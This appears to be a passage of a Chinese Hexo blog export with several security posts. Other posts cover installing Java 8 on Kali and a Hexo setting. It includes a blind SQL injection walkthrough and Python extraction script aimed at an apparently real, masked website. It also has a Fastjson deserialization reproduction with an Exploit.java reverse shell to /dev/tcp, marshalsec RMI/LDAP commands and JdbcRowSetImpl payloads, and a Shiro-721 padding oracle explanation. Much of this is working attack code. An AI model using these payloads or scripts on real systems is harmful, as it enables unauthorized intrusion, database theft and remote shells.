<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20sleep(3)</code> 会延时</p>
<p>判断数据库版本</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20left(version(),6)=%275.5.46%27</code> 得到 为mysql 5.5.46</p>
<p>判断当前数据库长度</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20length(database())&gt;5</code></p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20length(database())=6</code></p>
<p>得到长度为6位</p>
<p>猜解数据库</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20ascii(substr(database(),1,1))&gt;114</code></p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%20ascii(substr(database(),1,1))=115</code></p>
<p>判断出第一位为 115 对应 s</p>
<p>得到数据库名为 skytex</p>
<p>判断表长度</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=5</code></p>
<p>得到第一张表长度为5</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=10</code></p>
<br>

<p>第n张表</p>
<p><code>length((select table_name from information_schema.tables where table_schema=database() limit &#123;n&#125;,1))&gt;&#123;m&#125;</code></p>
<p>跑表内容</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#39;skytex&#39; limit 0,1),1,1))=97</code></p>
<p>第一张表为 atype</p>
<p>第二张表为 atypeainfo</p>
<p>… …</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.xxxxxx.com/products.php/&#x27;</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))   <span class="comment">#大/小写字母和数字的ascii，len=62</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库长度位6</span></span><br><span class="line"><span class="comment"># 第一张表长 5 第二张表长 10 第三张表为 8 第四张表 9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):  <span class="comment">#改变这里长度</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high - low &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        m = payloads[mid]  <span class="comment"># 二分法判断</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;  #数据库为 skytex</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 0,1),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;    #第一张表 atype</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 1,1),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;    #第二张表 atypeinfo</span></span><br><span class="line">        <span class="comment"># payload = f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 2,1),&#123;i&#125;,1))&gt;&#123;m&#125;&quot;    #第三张表 feedback</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=113 and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;skytex&#x27; limit 3,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>&quot;</span>    <span class="comment">#第四张表 webadmin</span></span><br><span class="line"></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;PZ-CAP&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装java8</title>
    <url>/posts/6cf74356/</url>
    <content><![CDATA[<h3 id="官网下载"><a href="#官网下载" class="headerlink" title="官网下载"></a>官网下载</h3><p><code>https://www.oracle.com/technetwork/java/javase/downloads/index.html</code> 选择下载java8 最新版为<code>jdk-8u291-linux-x64.tar.gz</code></p>
<h3 id="Jdk-传到kali并解压"><a href="#Jdk-传到kali并解压" class="headerlink" title="Jdk 传到kali并解压"></a>Jdk 传到kali并解压</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /usr/local/java</span><br><span class="line">mv jdk-8u291-linux-x64.tar.gz /usr/local/java</span><br><span class="line">cd /usr/local/java</span><br><span class="line">sudo tar -zxvf jdk-8u281-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="安装并注册"><a href="#安装并注册" class="headerlink" title="安装并注册"></a>安装并注册</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /usr/local/java/jdk1.8.0_291/bin/java 1</span><br><span class="line">update-alternatives --install /usr/bin/javac javac /usr/local/java/jdk1.8.0_291/bin/javac 1</span><br><span class="line">update-alternatives --set java /usr/local/java/jdk1.8.0_291/bin/java</span><br><span class="line">update-alternatives --set javac /usr/local/java/jdk1.8.0_291/bin/javac</span><br></pre></td></tr></table></figure>

<h3 id="查看java版本"><a href="#查看java版本" class="headerlink" title="查看java版本"></a>查看java版本</h3><p><code>java -version</code></p>
<blockquote>
<p>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
<p>java version “1.8.0_291”<br>Java(TM) SE Runtime Environment (build 1.8.0_291-b10)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.291-b10, mixed mode)</p>
</blockquote>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson反序列化复现</title>
    <url>/posts/37afa0e0/</url>
    <content><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>fastjson 是一款阿里的开源java库，用来实现java 对象与json字符串之间的相互转化</p>
<p>反序列化常用的两种利用方式，一种是基于rmi(Java远程方法调用)，一种是基于ldap。</p>
<p>@type处可以做反序列化 做反序列化时会调用对象的set方法<br>使用 JdbcRowSetImpl 从远程服务器上加载服务器端的类 从而执行恶意代码</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>靶机 vulhub-fastjson-1.2.24</p>
<p>ip：192.168.20.128</p>
<p>kali：192.168.20.129</p>
<p><code>docker-compose up -d</code> 访问<code>192.168.20.128:8090</code></p>
<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><h5 id="DNSLog回显"><a href="#DNSLog回显" class="headerlink" title="DNSLog回显"></a>DNSLog回显</h5><p>构造POST请求包，fastjson可以解析payload中val的值，如果dnslog有回显即为fastjson</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;:0</span><br></pre></td></tr></table></figure>

<br>

<h4 id="RMI方式"><a href="#RMI方式" class="headerlink" title="RMI方式"></a>RMI方式</h4><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><ol>
<li>靶机为vulhub8090端口</li>
<li>kali上利用python开启web服务，并把编译后的exp放到里面</li>
<li>kali 8001端口开启 rmi 服务（rmi 远程方法调用  A主机去调用B主机上的exp.class方法）</li>
<li>kali 8888端口监听反弹的shell</li>
</ol>
<h5 id="使用kali搭建一个临时web服务"><a href="#使用kali搭建一个临时web服务" class="headerlink" title="使用kali搭建一个临时web服务"></a>使用kali搭建一个临时web服务</h5><p><code>python3 -m http.server 9999</code></p>
<h5 id="编译生产exp-放在web目录下"><a href="#编译生产exp-放在web目录下" class="headerlink" title="编译生产exp,放在web目录下"></a>编译生产exp,放在web目录下</h5><p>Exploit.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/192.168.20.129/8888 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span>&#123;</span><br><span class="line">        <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进行编译<code>javac Exploit.java</code>生成Exploit.class</p>
<p>把编译好的Exploit.class放在kali上</p>
<h5 id="kali监听8888端口"><a href="#kali监听8888端口" class="headerlink" title="kali监听8888端口"></a>kali监听8888端口</h5><p><code>nc -lvvp 8888</code></p>
<h5 id="启动RMI服务"><a href="#启动RMI服务" class="headerlink" title="启动RMI服务"></a>启动RMI服务</h5><p>使用marshalsec项目，启动RMI服务，监听8001端口并加载远程类Exploit.class(marshalsec和编译后的Exploit.class放在同一目录下)</p>
<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8001</code></p>
<blockquote>
<p>kali@kali2020:~/Common/fastjson$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://192.168.20.129:9999/#Exploit&quot;">http://192.168.20.129:9999/#Exploit&quot;</a> 8001<br>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true</p>
<ul>
<li>Opening JRMP listener on 8001<br>Have connection from /192.168.20.128:49126<br>Reading message…<br>Is RMI.lookup call for Exploit 2<br>Sending remote classloading stub targeting <a href="http://192.168.20.129:9999/Exploit.class">http://192.168.20.129:9999/Exploit.class</a><br>WARNING: An illegal reflective access operation has occurred<br>WARNING: Illegal reflective access by marshalsec.util.Reflections (file:/home/kali/Common/fastjson/marshalsec-0.0.3-SNAPSHOT-all.jar) to field com.sun.jndi.rmi.registry.ReferenceWrapper.wrappee<br>WARNING: Please consider reporting this to the maintainers of marshalsec.util.Reflections<br>WARNING: Use –illegal-access=warn to enable warnings of further illegal reflective access operations<br>WARNING: All illegal access operations will be denied in a future release<br>Closing connection</li>
</ul>
</blockquote>
<p>原因貌似是因为java版本过高，这里默认使用的我昨天刚安装的javac11,换一个低版本的javac去进行编译,但是还是无法反弹shell.</p>
<p>查了半个下午，最终发现是因为kali 的java版本问题，kali原java版本为java11,然后安装了java8 再去开启rmi服务就正常了</p>
<p><img src="/posts/37afa0e0/rmi1.png"></p>
<p>成功反弹shell</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>1.2.24 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.20.129:8001/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.2.47</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.20.129:8001/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="LDAP方式"><a href="#LDAP方式" class="headerlink" title="LDAP方式"></a>LDAP方式</h4><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.20.129:9999/#Exploit&quot; 8002</code></p>
<p><img src="/posts/37afa0e0/ldap1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://192.168.20.129:8002/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.cnblogs.com/chen-w/p/14735881.html">https://www.cnblogs.com/chen-w/p/14735881.html</a></p>
<p><a href="https://blog.csdn.net/weixin_45556536/article/details/109486621">https://blog.csdn.net/weixin_45556536/article/details/109486621</a></p>
<p><a href="https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://choge.top/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
<p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
<p><a href="https://www.yuque.com/naraku/blog/leak-fastjson">https://www.yuque.com/naraku/blog/leak-fastjson</a></p>
</blockquote>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro721复现</title>
    <url>/posts/700536f4/</url>
    <content><![CDATA[<h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>shiro采用了AES-128-CBC的模式对cookie进行加密，这种加密方式可以使用Padding Oracle Attack( Oracle 填充攻击 ) ,用户可以通过这种方式构造恶意的RememberMe字段，并重新请求网站，进行反序列化攻击，从而达到任意代码执行.</p>
<p>影响版本: Apache Shiro  1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1版本</p>
<br>

<br>

<h3 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h3><p>AES/128/CBC/PKCS5Padding 加密</p>
<p>AES是一款对称加密 ,分组加密算法，这个书上有介绍过，不过最近书没在旁边，参考了下师傅们博客 </p>
<p><a href="https://blog.csdn.net/qq_28205153/article/details/55798628">https://blog.csdn.net/qq_28205153/article/details/55798628</a></p>
<p><a href="https://www.cxyxiaowu.com/3239.html">https://www.cxyxiaowu.com/3239.html</a></p>
<h4 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h4><p>AES的加密标准中，每个分组的 长度固定为128bits(16Bytes)，密钥长度为128bits,192bits,256bits,不同的密钥长度有不同的加密轮数,根据长度不同可以分为AES-128,AES-192,AES-256.</p>
<table>
<thead>
<tr>
<th>AES加密</th>
<th>密钥长度</th>
<th>分组长度</th>
<th>加密轮数</th>
</tr>
</thead>
<tbody><tr>
<td>AES-128</td>
<td>128bits</td>
<td>128bits</td>
<td>10</td>
</tr>
<tr>
<td>AES-192</td>
<td>192bits</td>
<td>128bits</td>
<td>12</td>
</tr>
<tr>
<td>AES-256</td>
<td>256bits</td>
<td>128bits</td>
<td>14</td>
</tr>
</tbody></table>
<h4 id="加密步骤"><a href="#加密步骤" class="headerlink" title="加密步骤"></a>加密步骤</h4><p>初始轮        </p>
<ul>
<li>轮密钥加（AddRoundKey）</li>
</ul>
<p>普通轮        </p>
<ul>
<li>字节替换    （SubBytes）</li>
<li>行位移（ShiftRows）</li>
<li>列混淆（MixColumns）</li>
<li>轮密钥加（AddRoundKey）</li>
</ul>
<p>最终轮        </p>
<ul>
<li>字节替换 （SubBytes）</li>
<li>行位移 （ShiftRows）</li>
<li>轮密钥加（AddRoundKey）</li>
</ul>
<p>具体加密步骤详解如下</p>
<h5 id="字节替换（SubBytes）"><a href="#字节替换（SubBytes）" class="headerlink" title="字节替换（SubBytes）"></a>字节替换（SubBytes）</h5><p>AES 字节替换的过程可以理解为一个查表的过程,AES提供了S盒和逆S盒，</p>
<p>字节的高四位作为行，字节底四位为列值，然后根据s盒中的对应的值作为输出，图中给出例如，加密时输出的字节S1为0x12，查S盒的第1行 ，第2列，得到的值为 0xc9</p>
<p>0xAB，查S盒第A行，第B列，得到值为0x62</p>
<p><img src="/posts/700536f4/s.png"></p>
<p><img src="/posts/700536f4/%5Es.png"></p>
<p><img src="/posts/700536f4/SubBytes.png"></p>
<p><img src="/posts/700536f4/SubBytes2.png"></p>
<h5 id="行位移（ShiftRows）"><a href="#行位移（ShiftRows）" class="headerlink" title="行位移（ShiftRows）"></a>行位移（ShiftRows）</h5><p>行位移，可以理解为左循环移位的操作</p>
<p><img src="/posts/700536f4/ShiftRows.png"></p>
<p><img src="/posts/700536f4/ShiftRows2.PNG"></p>
<p>行位移的逆变换相反，为左循环位移</p>
<h5 id="列混淆（MixColumns）"><a href="#列混淆（MixColumns）" class="headerlink" title="列混淆（MixColumns）"></a>列混淆（MixColumns）</h5><p>列混合变换  就是矩阵相乘,行位移后的状态矩阵盒固定矩阵相乘</p>
<p><img src="/posts/700536f4/MixColumns.png"></p>
<h5 id="轮密钥加（AddRoundKey）"><a href="#轮密钥加（AddRoundKey）" class="headerlink" title="轮密钥加（AddRoundKey）"></a>轮密钥加（AddRoundKey）</h5><p>轮密钥加时i将128为的轮密钥Ki和相同状态的矩阵中的数据逐位进行异或运算</p>
<p><img src="/posts/700536f4/AddRoundKey.png"></p>
<p>a[i,j]与k[i,j]异或，输出b[i,j]</p>
<br>

<h4 id="加密模式"><a href="#加密模式" class="headerlink" title="加密模式"></a>加密模式</h4><p>AES分组加密的加密模式，共五种可选加密模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ECS ( Electronic Codebook Book , 电话本模式 )</span><br><span class="line">CBC ( Cipher Block Chaining , 密码分组链接模式 )</span><br><span class="line">CTR ( Counter , 计算器模式 )</span><br><span class="line">CFB ( Cipher FeedBack , 密码反馈模式 )</span><br><span class="line">OFB ( Output FeedBack , 输出反馈模式 )</span><br></pre></td></tr></table></figure>

<p>在shiro中使用的为CBC的加密模式，</p>
<blockquote>
<p>CBC加密模式: 将明文切分成若干小段 , 然后每一段分别与上一段的密文进行异或运算 , 再与密钥进行加密 , 生成本段明文的密文 , 这段密文用于下一段明文的加密</p>
<p>第一段明文没有对应的密文，保证分组的唯一性，CBC加密模式使用了初始化向量（IV , Initialization Vector）初始化向量是一个固定长度的随机数 , 该向量会作为密文第一个块 , 随密文一同传输 .</p>
<p>在 CBC 模式中 , 初始化向量( IV ) 的长度与分组大小相同 , 为 16 Bytes( 128 bits ) , 因为链接模式中的异或操作是等长操作</p>
</blockquote>
<p><img src="/posts/700536f4/aes_Cbc_encryption-squashed.jpg"></p>
<p><img src="/posts/700536f4/aes_Cbc_decryption.png"></p>
<h5 id="加密模式对应的填充方式"><a href="#加密模式对应的填充方式" class="headerlink" title="加密模式对应的填充方式"></a>加密模式对应的填充方式</h5><p>填充有六种：NoPadding, PKCS#5, PKCS#7, ISO 10126, ANSI X9.23和ZerosPadding</p>
<ul>
<li><p>Nopadding</p>
<p>  不进行填充</p>
</li>
<li><p>PKCS#7 &amp; PKCS#5</p>
<p>  缺少几个字节就填充几个字节，值为填充的字节数  </p>
</li>
</ul>
<blockquote>
<p>例如,AAAAAAAA  BBBBBBBB CCCCCCCC    刚好分成3个分组<br>        AAAAAAAA  BBBBBBBB CCCCC            缺少3个字节 所以使用 0x03进行填充<br>       (这里例子的A B C 均视为一个字节)</p>
</blockquote>
<blockquote>
<p>不同在于PKCS5限定了块大小为8bytes而PKCS7没有限定，在AES加密当中严格来说是不能使用pkcs5的，因为AES的块大小是16bytes而pkcs5只能用于8bytes，通常我们在AES加密中所说的pkcs5指的就是pkcs7！    —-在知乎上看到的</p>
</blockquote>
<ul>
<li><p>ISO 10126</p>
<p>  最后一个字节是填充的字节数（包括最后一字节），其他全部填随机数</p>
</li>
</ul>
<blockquote>
<p>直接引用师傅的例子</p>
<p>… | DD DD DD DD DD DD DD DD | DD DD DD DD 81 A6 23 04 | … </p>
</blockquote>
<ul>
<li><p>ANSI X9.23</p>
<p>  和ISO 10126差不多，最后一个字节是填充的字节数，区别在 这种方法填充的其他字节都是0，而不是随机数</p>
</li>
<li><p>ZerosPadding</p>
<p>  缺少的字节全部使用 <code>0x00</code>填充</p>
</li>
</ul>
<br>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>AES加密大体上有所了解了，再回到shiro上来，看一下 AES/CBC/PKCS5Padding 即可</p>
<p><img src="/posts/700536f4/PKCS5Padding.png"></p>
<br>

<h4 id="Padding-Oracle-Attack-填充-Oracle-攻击"><a href="#Padding-Oracle-Attack-填充-Oracle-攻击" class="headerlink" title="Padding Oracle Attack( 填充 Oracle 攻击 )"></a>Padding Oracle Attack( 填充 Oracle 攻击 )</h4><p>是指使用密文的填充验证信息来进行解密的攻击方法,也就是通过加密数据解密后验证填充是否正确的方式</p>
<p>例如</p>
<p>用户去请求 <code>http://www.example.com?id=xxxxxxxxxxx</code></p>
<p>服务端接收客户端发送的数据后，会对参数值进行AES解密处理:</p>
<ul>
<li>密文无效        =&gt;    用户不存在。返回http 500</li>
<li>密文有效,填充有效        =&gt;    用户存在，登陆成功。返回htto 200</li>
<li>密文有效,填充无效        =&gt;    自定义报错。返回http 30X</li>
</ul>
<p>所以可以通过对填充进行爆破来确定有效的填充值</p>
<br>

<p><img src="/posts/700536f4/aes_Cbc_decryption.png"></p>
<p>Ciphertext通过Key解密为Midvalue,然后midvalue和IV进行异或处理得到Plaintext</p>
<p>那可以去创建一个FuzzIV 让它与Midvalue进行异或运算，得到Plaintext后再去验证填充是否有效</p>
<p>PKCS5Padding 中 padding的有效范围为0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 到 0x08 0x08 0x08 0x08 0x08 0x08 0x08 0x08 之间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FuzzIV[i] ^ Midvalue[i] = 0x01  =&gt; Midvalue[i] = FuzzIV[i] ^ 0x01</span><br><span class="line"> ===&gt;</span><br><span class="line">IV[i] ^ Midvalue[i] = Plaintext[i] =&gt; Plaintext[i] = IV[i] ^ FuzzIV[i] ^ 0x01</span><br></pre></td></tr></table></figure>

<p>最终得到 <code>Plaintext[i] = IV[i] ^ FuzzIV[i] ^ 0x01</code>, 而IV和FuzzIV是已知的，所以可以得到Plaintext的值,这就是 Padding Oracle Attack 的攻击原理</p>
<br>

<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><p>获取dockfile</p>
<p><code>git clone https://github.com/3ndz/Shiro-721.git</code><br><code>cd Shiro-721/Docker</code></p>
<p>构建并运行</p>
<p><code>docker build -t shiro-721 .  </code></p>
<p><code>docker run -p 8080:8080 -d shiro-721</code></p>
<p>尝试登录  root/secret，勾选RememberMe</p>
<p><img src="/posts/700536f4/login_success_rem.png"></p>
<p>可以看到 <code>Set-Cookie: rememberMe=deleteMe</code></p>
<br>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>使用burp抓取rememberMe</p>
<p><img src="/posts/700536f4/exp1.png"></p>
<p>需要爆破很长时间… …用了半个多小时…</p>
<p><img src="/posts/700536f4/exp2.png"></p>
<p><img src="/posts/700536f4/exp3.png"></p>
<p>最终成功反弹shell</p>
<br>

<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><ul>
<li>升级 Shiro版本</li>
<li>使用waf拦截过于频繁访问的ip</li>
<li>使用waf拦截Cookie中长度过大的RememberMe值</li>
<li>升级jdk版本</li>
</ul>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/">https://www.guildhab.top/2020/11/cve-2019-12422-shiro721-apache-shiro-rememberme-padding-oracle-1-4-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E5%88%86%E6%9E%90-%E4%B8%8A/</a></p>
<p><a href="https://www.cnblogs.com/backlion/p/14077791.html">https://www.cnblogs.com/backlion/p/14077791.html</a></p>
<p><a href="https://www.yuque.com/m1tang/gqsay7/qwegln">https://www.yuque.com/m1tang/gqsay7/qwegln</a></p>
<p><a href="https://www.bilibili.com/video/BV1yX4y1V75c">https://www.bilibili.com/video/BV1yX4y1V75c</a></p>
<p><a href="https://www.cxyxiaowu.com/3239.html">https://www.cxyxiaowu.com/3239.html</a></p>
<p><a href="https://blog.csdn.net/qq_28205153/article/details/55798628">https://blog.csdn.net/qq_28205153/article/details/55798628</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/131324301">https://zhuanlan.zhihu.com/p/131324301</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo首页只显示部分摘要（不显示全文）</title>
    <url>/posts/2825537d/</url>
    <content><![CDATA[<p>在next主题d_config.yml中更改设置(默认安装时就打开了)</p>
<blockquote>
<p># Automatically excerpt description in homepage as preamble text.</p>
<p>excerpt_description: true</p>
</blockquote>
<p>在文章的md中可以添加<code>description: &#39;&#39;</code>其中里面的内容就会显示在首页上 如果向这样填写，就不会在页面上显示东西。</p>
<br>

<p>这次突然有两个页面全部加载在了主页上，看了下是没有添加description的原因</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化</title>
    <url>/posts/7c19cc12/</url>
